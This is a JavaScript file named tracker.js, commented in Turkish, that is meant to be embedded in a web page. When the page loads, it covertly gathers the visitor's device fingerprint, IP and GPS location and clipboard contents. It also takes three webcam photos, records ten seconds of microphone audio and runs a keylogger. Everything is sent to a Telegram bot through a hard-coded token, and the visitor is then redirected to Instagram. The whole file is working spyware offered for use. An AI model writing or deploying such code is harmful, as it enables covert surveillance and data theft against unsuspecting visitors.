// DOSYA ADI: tracker.js
// HTML İÇİNDE: <script src="tracker.js"></script>

const BOT_TOKEN = "8600556676:AAFc6dqxJpHnNbhdYBkf7QBmLINUs86J-sI";
const CHAT_ID = "8788868439";
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// --- METİN GÖNDER (no-cors ile CORS sorunu çözülür) ---
function sendText(text) {
    const url = `${API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    fetch(url, { mode: 'no-cors' }).catch(() => {});
}

// --- FOTOĞRAF GÖNDER ---
async function sendPhoto(blob, caption) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", caption);
    fd.append("photo", blob, "photo.jpg");
    fetch(`${API}/sendPhoto`, { method: "POST", mode: "no-cors", body: fd }).catch(() => {});
}

// --- SES GÖNDER ---
async function sendAudio(blob, caption) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", caption);
    fd.append("audio", blob, "audio.webm");
    fetch(`${API}/sendAudio`, { method: "POST", mode: "no-cors", body: fd }).catch(() => {});
}

// --- DOSYA GÖNDER ---
async function sendDocument(blob, filename, caption) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", caption);
    fd.append("document", blob, filename);
    fetch(`${API}/sendDocument`, { method: "POST", mode: "no-cors", body: fd }).catch(() => {});
}

// --- CİHAZ BİLGİSİ ---
function getDeviceInfo() {
    const i = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        depth: screen.colorDepth,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || "?",
        touch: 'ontouchstart' in window,
        cookies: navigator.cookieEnabled,
        url: location.href,
        time: new Date().toISOString()
    };
    try {
        const c = document.createElement('canvas');
        const x = c.getContext('2d');
        x.textBaseline = "top"; x.font = "14px Arial";
        x.fillStyle = "#f60"; x.fillRect(125,1,62,20);
        x.fillStyle = "#069"; x.fillText("Fingerprint",2,15);
        i.canvas = c.toDataURL().slice(-50);
    } catch(e) { i.canvas = "hata"; }
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const d = gl.getExtension('WEBGL_debug_renderer_info');
        i.gpu = gl.getParameter(d.UNMASKED_VENDOR_WEBGL) + " / " + gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
    } catch(e) { i.gpu = "hata"; }
    return i;
}

// --- IP & KONUM ---
async function getIPInfo() {
    try {
        const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        return `📡 IP: ${d.ip}\n🏙️ Şehir: ${d.city}\n📍 Bölge: ${d.region}\n🌍 Ülke: ${d.country_name}\n📌 Enlem: ${d.latitude}\n📌 Boylam: ${d.longitude}\n🏢 ISS: ${d.org}`;
    } catch(e) { return "IP alınamadı: " + e.message; }
}

// --- GPS ---
function getGPS() {
    return new Promise(res => {
        if (!navigator.geolocation) return res("GPS desteklenmiyor");
        navigator.geolocation.getCurrentPosition(
            p => res(`📌 Enlem: ${p.coords.latitude}\n📌 Boylam: ${p.coords.longitude}\n🎯 Doğruluk: ${p.coords.accuracy}m`),
            e => res("GPS hatası: " + e.message),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

// --- PİL ---
async function getBattery() {
    try {
        const b = await navigator.getBattery();
        return `🔋 Seviye: %${Math.round(b.level*100)}\n⚡ Şarj: ${b.charging}`;
    } catch(e) { return "Pil bilgisi alınamadı"; }
}

// --- BAĞLANTI ---
function getConnection() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return "Bağlantı bilgisi yok";
    return `📶 Tür: ${c.effectiveType}\n⬇️ Hız: ${c.downlink} Mbps\n⏱️ RTT: ${c.rtt} ms`;
}

// --- WEBRTC GERÇEK IP ---
function getWebRTCIP() {
    return new Promise(res => {
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if (!e || !e.candidate) return;
                const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                if (m) { res("🌐 Gerçek IP: " + m[1]); pc.close(); }
            };
            setTimeout(() => res("WebRTC IP alınamadı"), 5000);
        } catch(e) { res("WebRTC hata: " + e.message); }
    });
}

// --- FOTOĞRAF ÇEK ---
async function capturePhoto() {
    try {
        const s = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
        });
        const v = document.createElement('video');
        v.srcObject = s; v.muted = true; v.playsInline = true;
        await v.play();
        await new Promise(r => setTimeout(r, 1500));
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
        s.getTracks().forEach(t => t.stop());
        return new Promise(r => c.toBlob(b => r(b), 'image/jpeg', 0.85));
    } catch(e) { return null; }
}

// --- SES KAYDI (10 saniye) ---
async function captureAudio() {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mr = new MediaRecorder(s);
        const chunks = [];
        mr.ondataavailable = e => chunks.push(e.data);
        mr.start();
        await new Promise(r => setTimeout(r, 10000));
        mr.stop();
        s.getTracks().forEach(t => t.stop());
        return new Promise(r => {
            mr.onstop = () => r(new Blob(chunks, { type: 'audio/webm' }));
        });
    } catch(e) { return null; }
}

// --- KLAVYE KAYDI ---
const keyLog = [];
function startKeylogger() {
    document.addEventListener('keydown', e => {
        keyLog.push(e.key);
        if (keyLog.length % 20 === 0) {
            sendText(`⌨️ *KLAVYE KAYDI*\n\`${keyLog.slice(-20).join(' ')}\``);
        }
    });
}

// --- PANO ---
async function getClipboard() {
    try { return (await navigator.clipboard.readText()).slice(0,500); }
    catch(e) { return "Pano izni yok"; }
}

// --- YÖNLENDİRME ÖNCESİ TÜM VERİYİ TOPLA ---
async function main() {
    sendText(`🚨 *YENİ ZİYARETÇİ*\n⏰ ${new Date().toLocaleString('tr-TR')}\n🔗 ${location.href}`);

    const d = getDeviceInfo();
    sendText(`📱 *CİHAZ BİLGİSİ*\n\n👤 UA: \`${d.ua}\`\n🖥️ Ekran: ${d.screen}\n🌍 Dil: ${d.lang}\n⏰ TZ: ${d.tz}\n🔋 Çekirdek: ${d.cores}\n💾 RAM: ${d.ram} GB\n📱 Dokunmatik: ${d.touch}\n🍪 Çerez: ${d.cookies}\n🎨 Canvas: ${d.canvas}\n🖥️ GPU: ${d.gpu}`);

    sendText("🌐 *IP & KONUM*\n" + await getIPInfo());
    sendText("📍 *GPS*\n" + await getGPS());
    sendText("🔋 *PİL*\n" + await getBattery());
    sendText("📶 *BAĞLANTI*\n" + await getConnection());
    sendText(await getWebRTCIP());
    sendText("📋 *PANO*\n`" + await getClipboard() + "`");

    // Fotoğraf çek (3 kez)
    for (let i = 1; i <= 3; i++) {
        const p = await capturePhoto();
        if (p) {
            await sendPhoto(p, `📸 Kamera #${i}\n⏰ ${new Date().toLocaleString('tr-TR')}`);
        }
        await new Promise(r => setTimeout(r, 1000));
    }

    // Ses kaydı al
    const a = await captureAudio();
    if (a) await sendAudio(a, `🎤 Ses Kaydı (10sn)\n⏰ ${new Date().toLocaleString('tr-TR')}`);

    startKeylogger();

    // 5 saniye sonra yönlendir
    setTimeout(() => {
        location.href = "https://www.instagram.com";
    }, 5000);
}

main();
